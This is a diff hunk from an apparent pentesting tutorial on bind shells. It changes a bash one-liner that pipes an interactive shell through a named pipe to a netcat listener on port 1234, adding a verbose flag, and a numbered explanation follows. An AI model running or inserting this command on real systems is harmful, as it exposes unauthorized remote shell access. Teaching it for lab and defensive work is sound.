@@ -48,7 +48,7 @@ To setup a bind shell on the server, we need to define:
 
 **Bash**
 ```bash
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -l 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lv 1234 >/tmp/f
 ```
 > 1. Remove any existing `/tmp/f`
 > 2. Create a named pipe at `/tmp/f` with `mkfifo`
